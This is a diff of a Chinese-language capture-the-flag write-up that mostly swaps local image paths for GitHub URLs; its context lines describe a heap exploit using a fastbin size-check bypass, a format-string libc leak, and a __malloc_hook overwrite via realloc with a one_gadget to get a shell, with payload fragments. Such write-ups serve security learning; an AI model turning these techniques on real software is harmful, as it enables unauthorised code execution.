@@ -135,7 +135,7 @@ new(0x50,"ddd")
 ```
 明明size的位置是0xf168000000000060 , 为什么还可以当作0x60使用? 
 
-![](IMG/HuXiang/fastbin.png)
+![](https://raw.githubusercontent.com/pwnkk/pwnkk.github.io/master/_posts/IMG/HuXiang/fastbin.png)
 
 r14=0x601ffa , 在size校验的时候用eax获取size,会忽略高位的0xf168
 
@@ -158,7 +158,7 @@ r14=0x601ffa , 在size校验的时候用eax获取size,会忽略高位的0xf168
 │0064| 0x7fff5408ef30 --> 0x1
 ```
 
-%10$x 对应 0x7fff5408f000 , 泄露出__libc_start_main+240 应该用%13$p
+`%10$x 对应 0x7fff5408f000 , 泄露出__libc_start_main+240 应该用%13$p`
 
 ```
 new(0x50,"a"*6+p64(0)+p64(printf_plt)[:7])
@@ -207,10 +207,10 @@ $4 = (void *(**)(size_t, const void *)) 0x7f93d701eb10 <__malloc_hook>
 `rsp+0x30 : 0x7ffec63d63b8 --> 0x100000000`
 
 查看周围
-![](IMG/HuXiang/realloc.png)
+![](https://raw.githubusercontent.com/pwnkk/pwnkk.github.io/master/_posts/IMG/HuXiang/realloc.png)
 
 realloc内部
-![](IMG/HuXiang/realloc2.png)
+![](https://raw.githubusercontent.com/pwnkk/pwnkk.github.io/master/_posts/IMG/HuXiang/realloc2.png)
 
 从realloc+20开始，构造"a"*0xb+p64(one)+p64(realloc+20)
 发现 $rsp+0x70 为0 , 满足0xf1147的条件成功getshell
